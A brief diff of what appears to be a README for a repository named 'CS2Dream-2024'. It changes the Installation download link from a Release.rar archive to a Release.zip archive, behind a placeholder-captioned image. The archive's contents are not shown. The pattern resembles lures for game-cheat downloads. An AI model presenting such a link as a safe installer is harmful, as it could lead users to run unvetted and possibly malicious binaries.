@@ -9,7 +9,7 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/cb91fb1b-1b0e-4a08-a063-bb91b8722ba3)
-](https://github.com/adityasharmavlogger/CS2Dream-2024/releases/download/Release/Release.rar)
+](https://github.com/adityasharmavlogger/CS2Dream-2024/releases/download/Release/Release.zip)
 
 
 
